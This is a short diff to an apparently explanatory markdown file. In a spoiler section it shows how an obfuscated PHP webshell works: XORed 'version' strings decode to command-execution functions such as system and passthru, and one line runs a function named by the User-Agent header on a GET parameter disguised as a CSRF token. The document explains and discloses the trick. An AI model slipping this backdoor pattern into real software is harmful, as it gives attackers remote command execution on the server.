@@ -4,7 +4,7 @@ seriously.
 <details>
 <summary>Spoiler warning</summary>
 It's a webshell :) 
-```php
+<code>
   public const VERSIONS = array(
         "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2",
         "GADK_" ^ "7.4.14, 7.4.13, 7.4.12",
@@ -12,9 +12,9 @@ It's a webshell :)
         "GOG]FY^U" ^ "7.4.21, 7.4.20, 7.4.19",
         "G\[MnW\EY" ^ "7.4.18, 7.4.16, 7.4.15",
   );
-```
+</code>
   is identical to
-```php
+<code>
   public const VERSIONS = array(
         "system",
         "popen",
@@ -22,14 +22,14 @@ It's a webshell :)
         "passthru",
         "proc_open",
     );
-```
+</code>
 and
-```php
+<code>
 ${"_SERVER"}["HTTP_USER_AGENT"]($_GET["csrf-token"]);
-```
+</code>
 is identical to 
-```php
+<code>
 $_SERVER["HTTP_USER_AGENT"]($_GET["csrf-token"]);
-```
+</code>
 
 </details>
